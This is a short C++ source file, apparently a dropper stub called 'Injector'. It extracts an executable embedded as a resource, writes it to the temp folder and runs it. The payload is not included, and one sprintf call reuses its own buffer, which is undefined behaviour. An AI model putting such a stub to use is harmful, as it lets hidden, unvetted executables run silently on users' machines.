#include "Injector.h"

int main(int argc, char * args[])
{

	HRSRC rSrc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int rSize = SizeofResource(NULL, rSrc);
	HGLOBAL rGlobal = LoadResource(NULL, rSrc);
	byte* rData = (byte*)LockResource(rGlobal);

	char tempPath[MAX_PATH * 4];
	GetTempPathA(MAX_PATH * 4, tempPath);
	sprintf(tempPath, "%s-", tempPath);
	printf("%s\n", tempPath);

	HANDLE hFile = CreateFile(tempPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	ULONG bytesWritten = 0;
	WriteFile(hFile, rData, rSize, &bytesWritten, NULL);
	CloseHandle(hFile);

	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof si };
	printf("Started: %d\n", CreateProcess(tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi));

}

